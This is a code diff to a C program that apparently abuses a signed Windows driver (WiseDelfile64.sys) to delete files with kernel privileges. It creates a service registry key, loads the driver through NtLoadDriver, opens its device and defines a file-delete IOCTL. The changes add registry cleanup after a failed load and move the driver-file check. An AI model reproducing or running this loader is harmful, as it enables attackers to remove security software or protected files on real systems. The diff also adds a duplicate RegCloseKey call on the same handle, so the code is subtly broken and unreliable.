@@ -3,6 +3,7 @@
 
 // WiseDelfile64.sys SHA256: 8c4c6cc6685a719ac4e6119e1dac4ba029eba21720d5c3ca340006c9113cc6df
 
+#define DEVICE_NAME L"\\\\.\\WiseDelfile"
 #define HANDSHAKE_IOCTL CTL_CODE(0x22, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define DELFILE_IOCTL   CTL_CODE(0x22, 0x001, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
@@ -153,9 +154,10 @@ BOOL LoadDriver(HMODULE hNtdll, const wchar_t* serviceName, const wchar_t* drive
     wcscpy(regPath, L"SYSTEM\\CurrentControlSet\\Services\\");
     wcscat(regPath, serviceName);
 
-    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
+    DWORD disposition = 0;
+
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS)
         return FALSE;
-    }
 
     DWORD type = SERVICE_KERNEL_DRIVER;
     DWORD start = SERVICE_DEMAND_START;
@@ -172,6 +174,8 @@ BOOL LoadDriver(HMODULE hNtdll, const wchar_t* serviceName, const wchar_t* drive
     RegSetValueExW(hKey, L"ImagePath", 0, REG_SZ, (BYTE*)ntImagePath, pathLen);
     RegCloseKey(hKey);
 
+    RegCloseKey(hKey);
+
     wcscpy(ntPath, L"\\Registry\\Machine\\");
     wcscat(ntPath, regPath);
 
@@ -182,7 +186,12 @@ BOOL LoadDriver(HMODULE hNtdll, const wchar_t* serviceName, const wchar_t* drive
 
     NtLoadDriver_t NtLoadDriver = (NtLoadDriver_t)GetProcAddress(hNtdll, "NtLoadDriver");
 
-    return (NtLoadDriver && NT_SUCCESS(NtLoadDriver(&uPath)));
+    BOOL success = (NtLoadDriver && NT_SUCCESS(NtLoadDriver(&uPath)));
+
+    if (!success && disposition == REG_CREATED_NEW_KEY)
+        RegDeleteTreeW(HKEY_LOCAL_MACHINE, regPath);
+
+    return success;
 }
 
 BOOL UnloadDriver(HMODULE hNtdll, const wchar_t* serviceName) {
@@ -364,14 +373,6 @@ void mainCRTStartup() {
     
     wcscat(driverPath, L"\\WiseDelfile64.sys");
 
-    DWORD driverAttrib = GetFileAttributesW(driverPath);
-    if (driverAttrib == INVALID_FILE_ATTRIBUTES || (driverAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
-        PrintW(L"[-] Driver file not found: ");
-        PrintW(driverPath);
-        PrintW(L"\n");
-        ExitProcess(-1);
-    }
-
     const wchar_t* serviceName = L"WiseDelfile";
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     
@@ -380,17 +381,26 @@ void mainCRTStartup() {
 	BOOL driverLoaded = FALSE;
 	
     for (int i = 0; i < 2; i++) {
-        hDevice = CreateFileW(L"\\\\.\\WiseDelfile", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
     
         if (hDevice != INVALID_HANDLE_VALUE)
             break;
 
         if (i == 0) {
-            if (!LoadDriver(hNtdll, serviceName, driverPath)) {
-                PrintW(L"[-] Failed to Load Driver\n");
+            DWORD driverAttrib = GetFileAttributesW(driverPath);
+            if (driverAttrib == INVALID_FILE_ATTRIBUTES || (driverAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
+                PrintW(L"[-] Driver file not found: ");
+                PrintW(driverPath);
+                PrintW(L"\n");
                 ExitProcess(-1);
             }
 
+            if (!LoadDriver(hNtdll, serviceName, driverPath)) {
+                PrintW(L"[-] Failed to Load Driver: ");
+                PrintW(driverPath);
+                PrintW(L"\n");
+                ExitProcess(-1);
+            }
             driverLoaded = TRUE;
         }
     }
@@ -408,7 +418,9 @@ void mainCRTStartup() {
         
         CloseHandle(hDevice);
     } else {
-        PrintW(L"[-] Unable to obtain device handle\n");
+        PrintW(L"[-] Unable to obtain device handle: ");
+        PrintW(DEVICE_NAME);
+        PrintW(L"\n");
     }
 
     if (driverLoaded)
